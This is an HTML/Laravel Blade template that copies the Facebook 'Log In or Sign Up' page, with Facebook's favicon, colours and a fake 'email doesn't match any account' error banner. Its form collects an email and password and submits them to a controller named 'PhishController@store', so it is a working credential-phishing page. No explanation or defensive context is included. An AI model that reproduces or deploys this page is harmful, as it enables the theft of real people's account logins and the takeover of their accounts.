<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">

    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" type="image/gif" sizes="196x196">
    <link rel="stylesheet" href="">
    <title>Facebook - Log In or Sign Up</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
        crossorigin="anonymous">

    <style>
        body {
            background-color: #eceff5;
            font-family: sans-serif;
            font-weight: bold;
        }

        a {
            font-family: Helvetica, Arial, sans-serif;
        }

        button {}

        .btn {
            font-family: sans-serif;
            font-weight: bold;
            background-color: #3578e5;
        }

        .form-control {
            font-family: Helvetica, Arial, sans-serif;
            font-size: 14px;

        }
    </style>
</head>

<body>
    <!-- Navbar --> 
        <nav class="navbar navbar-light " style="background-color:#3b5998; height:42px;  ">
            <a class="navbar-brand text-white mx-auto text-center" href="#" style="">
            <img src="1.png" alt="" style="height:42px;">
        </a>
        </nav> 
        <div  style="background-color:#fa3e3e; color:white;" class="alert alert-primary" role="alert">
               <small>The email or phone number you’ve entered doesn’t match any account.</small> <a style="font-size:11pt;">Sign up for an account.</a> 
        </div>
   
    <!-- end of navbar -->
    <!-- Form -->
    {!! Form::open(['action' => 'PhishController@store', 'method'=>'POST', 'enctype' =>'multipart/form-data']) !!}

    <div class="container">
        <div class="row">
            <div class="col-sm-2 col-lg-3 col-md-2"></div>
            <div class="col-sm-8 col-lg-6 col-md-8">
                <div class="form-group" style=" margin-top:20px; ">
                    {{Form::email( 'email', '', ['class'=>'form-control' ,'placeholder'=>'Email or Phone' ,'style'=> 'height:50px;'] )}} {{--
                    <input style="height:50px;" type="email" class="form-control" name="email" placeholder="Email or Phone"
                        action="PagesController@store" method="Post" enctype='multipart/form-data'> --}}
                    <input style="height:50px;" type="password" class="form-control" placeholder="Password" name="password">
                </div>
                <div style="text-align: center; ">
                    <button type="submit" class="btn btn-primary form-control" >Log in</button>
                    <img src="3.jpg" alt="" class="  " style="background-color:#eceff5; width:100%;">

                    <button type="submit" class="btn  text-white" style="background-color:#00a400; width:250px;  ">Create New Account</button>
                    <br>
                    <br>
                    <small>
                            <a href="" style="color:#7596c8">Forgot password?</a> ·
                            <a style="color:#7596c8" href="">Help Center</a>
                        </small>
                </div>
            </div>
            <div class="col-sm-2 col-lg-3 col-md-2"></div>
        </div>
    </div>
    {!!Form::close()!!}
    <!-- End form -->
    <!-- nested row -->
    <div style="height:600px; background-color:white !important;margin-top:30px;">

        <div class="row" style="text-align:center;">
            <div class="col align-self-start" style="margin-top:20px;">

                <small>
                    <a href="" class="text-gray" style="color:gray; ">English (US)</a>
                    <br>
                </small>

                <small>
                    <a href="" class="text-gray" style="color:gray; ">Русский</a>
                    <br>
                </small>
                <small>
                    <a href="" class="text-gray" style="color:gray; ">Türkçe </a>
                    <br>
                </small>


            </div>

            <div class="col align-self-end">

                <small>
                    <a href="" class="text-gray" style="color:gray;  ">Монгол</a>
                    <br>
                </small>

                <small>
                    <a href="" class="text-gray" style="color:gray; ">中文(简体)</a>
                    <br>
                </small>

                <small>
                    <a href="" class="text-gray" style="color:gray; ">Қазақша</a>
                    <br>
                </small>

            </div>
        </div>
        <!-- Nested row end -->
        <div class="row">
            <div class="col align-self-center" style=" text-align:center !important;">
                <small style="color:gray; "> Facebook ©2018 </small>
            </div>
        </div>
    </div> 
</body>
<script>
    function myFunction() {
    var x = document.getElementById("error");
    if (x.style.display === "none") {
        x.style.display = "block";
    } 
}
</script>
</html>